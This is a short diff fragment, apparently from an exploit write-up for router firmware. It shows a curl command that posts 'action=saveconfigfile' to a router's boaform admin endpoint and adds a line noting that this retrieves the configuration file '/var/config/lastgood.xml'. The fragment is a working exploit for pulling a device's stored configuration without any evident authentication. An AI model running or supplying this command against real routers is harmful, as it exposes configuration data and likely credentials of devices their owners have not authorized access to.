@@ -49,6 +49,8 @@ exploit
 
 curl -s -L -d 'action=saveconfigfile&submit-url=' 'http://192.168.1.1/boaform/admin/formMgmConfig'
 
+This gets the file "/var/config/lastgood.xml" 
+
 
 
 
